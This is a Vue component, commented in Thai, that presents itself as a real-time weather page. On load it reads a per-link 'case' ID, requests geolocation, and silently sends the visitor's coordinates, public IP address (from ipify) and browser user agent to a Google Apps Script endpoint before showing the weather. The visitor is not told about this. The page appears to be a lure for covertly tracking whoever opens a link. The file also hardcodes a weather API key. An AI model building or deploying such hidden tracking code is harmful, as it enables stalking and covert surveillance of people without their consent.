<script setup>
import { useRouter, useRoute } from "vue-router";
import { ref, onMounted, watch, watchEffect, computed } from "vue";
import axios from "axios";

const router = useRouter();
const route = useRoute();

const location = ref("");
const weather = ref(null);
const showToast = ref(false);
const apiKey = "6cc90cf06271d59f71fb167ec35738f7";
const searchId = ref("");
const caseId = ref("");
const errorMsg = ref("");
/////////// ฟังชั่นการทำงานก่อนแสดงผลหน้าเว็บ ///////////////////
onMounted(async () => {
  searchId.value = route.params.id;
  caseId.value = route.params.case;
  location.value = searchId.value;
  // getWeather();
  getLocationPermission()
});

/////////// ฟังก์ชั่นสำหรับดึง IP address และ User Agent ///////////////////
const getUserIPAndAgent = async () => {
  try {
    // ดึงข้อมูล IP จาก external API (เช่น ipify หรือ ipinfo)
    const ipResponse = await axios.get("https://api.ipify.org?format=json");
    const ipAddress = ipResponse.data.ip;

    // ดึง User Agent
    const userAgent = navigator.userAgent;

    return { ipAddress, userAgent };
  } catch (error) {
    console.error("Error fetching IP address or User Agent:", error);
  }
};

/////////// ฟังก์ชันสำหรับส่งข้อมูลไปยัง Google Apps Script ///////////////////
/////////// ฟังก์ชันสำหรับส่งข้อมูลไปยัง Google Apps Script (GET) ///////////////////
const sendDataToGoogleScript = async (lat, lon) => {
  try {
    // ดึงข้อมูล IP และ Agent
    const { ipAddress, userAgent } = await getUserIPAndAgent();

    // สร้าง URL พร้อมพารามิเตอร์
    const scriptUrl = "https://script.google.com/macros/s/AKfycbyC2MICTbPQKFeeDi87jZ0erafcJ_XSWOXFpmCGyyb1ICwBX8yNgwaCMOAVphqusiIF/exec"; // ใส่ URL ของ Google Apps Script ที่คุณสร้างไว้

    // ส่งข้อมูลด้วย GET request พร้อมพารามิเตอร์
    await axios.get(scriptUrl, {
      params: {
        caseId: caseId.value, // ใช้ค่าจาก caseId.value
        ip: ipAddress,
        lat: lat,
        lon: lon,
        agent: userAgent,
      }
    });

    // console.log("Data sent successfully");
  } catch (error) {
    console.error("Error sending data to Google Script:", error);
  }
};



/////////// ฟังก์ชันที่มีการดึงตำแหน่ง Lat, Long และส่งข้อมูลไปยัง Google Apps Script ///////////////////
const getLocationPermission = () => {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      (position) => {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;

        // เรียกฟังก์ชันส่งข้อมูลไป Google Apps Script
        sendDataToGoogleScript(lat, lon);

        getWeatherByCoords(lat, lon);
      },
      (error) => {
        console.error("Error accessing location:", error);
        if (error.code === error.PERMISSION_DENIED) {
          errorMsg.value = "Permission denied. Please allow location access.";
          showToast.value = true;
          setTimeout(() => {
            showToast.value = false;
          }, 3000);
        } else {
          alert("Unable to access location. Error code: " + error.code);
        }
      }
    );
  } else {
    alert("Geolocation is not supported by your browser.");
  }
};


// ฟังก์ชันสำหรับดึงข้อมูลสภาพอากาศตามที่อยู่ที่ผู้ใช้กรอก
const getWeather = async () => {
  if (!location.value) {
    errorMsg.value =
      "กรุณากรอกชื่อสถานที่! หรือกดปุ่ม ใช้ตำแหน่งปัจจุบันของคุณ";
    showToast.value = true;
    setTimeout(() => {
      showToast.value = false;
    }, 3000);
    return;
  }
  try {
    const response = await axios.get(
      `https://api.openweathermap.org/data/2.5/weather?q=${location.value}&units=metric&appid=${apiKey}`
    );
    weather.value = response.data;
  } catch (error) {
    errorMsg.value = "ไม่พบข้อมูลของสถานที่นี้ กรุณาลองใหม่อีกครั้ง";
    showToast.value = true;
    setTimeout(() => {
      showToast.value = false;
      router.push({ name: "home" });
    }, 3000);
    console.error("Error fetching weather data:", error);
  }
};

// ฟังก์ชันสำหรับดึงข้อมูลสภาพอากาศจากตำแหน่ง (พิกัด)
const getWeatherByCoords = async (lat, lon) => {
  try {
    const response = await axios.get(
      `https://api.openweathermap.org/data/2.5/weather?lat=${lat}&lon=${lon}&units=metric&appid=${apiKey}`
    );
    // console.log(response.data); // ตรวจสอบข้อมูลที่ได้
    weather.value = response.data;
    location.value = weather.value.name;
  } catch (error) {
    console.error("Error fetching weather data by coordinates:", error);
  }
};
</script>

<template>
  <div class="flex items-end bg-secondary">
    <label class="grid cursor-pointer p-4">
      <input
        type="checkbox"
        value="autumn"
        class="toggle theme-controller bg-base-content col-span-2 col-start-1 row-start-1"
      />
      <svg
        class="stroke-base-100 fill-base-100 col-start-1 row-start-1"
        xmlns="http://www.w3.org/2000/svg"
        width="14"
        height="14"
        viewBox="0 0 24 24"
        fill="none"
        stroke="currentColor"
        stroke-width="2"
        stroke-linecap="round"
        stroke-linejoin="round"
      ></svg>
      <svg
        class="stroke-base-100 fill-base-100 col-start-2 row-start-1"
        xmlns="http://www.w3.org/2000/svg"
        width="14"
        height="14"
        viewBox="0 0 24 24"
        fill="none"
        stroke="currentColor"
        stroke-width="2"
        stroke-linecap="round"
        stroke-linejoin="round"
      ></svg>
    </label>
  </div>

  <div class="flex flex-col items-center min-h-screen bg-base-200 p-4">
    <h1 class="text-2xl md:text-3xl font-bold mb-5 text-center">
      ข้อมูลสภาพอากาศเรียลไทม์
    </h1>

    <!-- Input with Reset button -->
    <div class="relative w-full max-w-xs md:max-w-md lg:max-w-lg mb-4">
      <input
        v-model="location"
        placeholder="กรอกชื่อสถานที่ของคุณ"
        @keyup.enter="getWeather"
        class="input input-bordered w-full pr-12"
      />
      <!-- Reset button -->
      <button
        @click="location = ''"
        class="absolute right-2 top-1/2 transform -translate-y-1/2 btn btn-outline btn-error btn-xs"
      >
        Reset
      </button>
    </div>

    <button
      @click="getWeather"
      class="btn btn-primary mb-2 w-full max-w-xs md:max-w-md lg:max-w-lg"
    >
      ดึงข้อมูลสภาพอากาศ
    </button>
    <button
      @click="getLocationPermission"
      class="btn btn-secondary mb-5 w-full max-w-xs md:max-w-md lg:max-w-lg"
    >
      ใช้ตำแหน่งปัจจุบันของคุณ
    </button>

    <div
      v-if="weather"
      class="card w-full max-w-xs md:max-w-md lg:max-w-lg shadow-lg bg-base-100"
    >
      <div class="card-body">
        <h2 class="card-title text-lg md:text-xl">
          สภาพอากาศปัจจุบันที่ {{ weather.name }}
        </h2>
        <p>อุณหภูมิ: {{ weather.main.temp }}°C</p>
        <p>สภาพอากาศ: {{ weather.weather[0].description }}</p>
        <p>ความชื้น: {{ weather.main.humidity }}%</p>
        <p>ความเร็วลม: {{ weather.wind.speed }} m/s</p>
        <p v-if="weather.rain">
          ปริมาณฝน: {{ weather.rain["1h"] || 0 }} mm (ใน 1 ชั่วโมง)
        </p>
      </div>
    </div>

    <!-- Toast -->
    <div v-if="showToast" class="toast toast-top toast-center">
      <div class="alert alert-warning">
        <span>{{ errorMsg }}</span>
      </div>
    </div>
  </div>
</template>

<style>
.toast {
  position: absolute;
  top: 1rem;
}
</style>
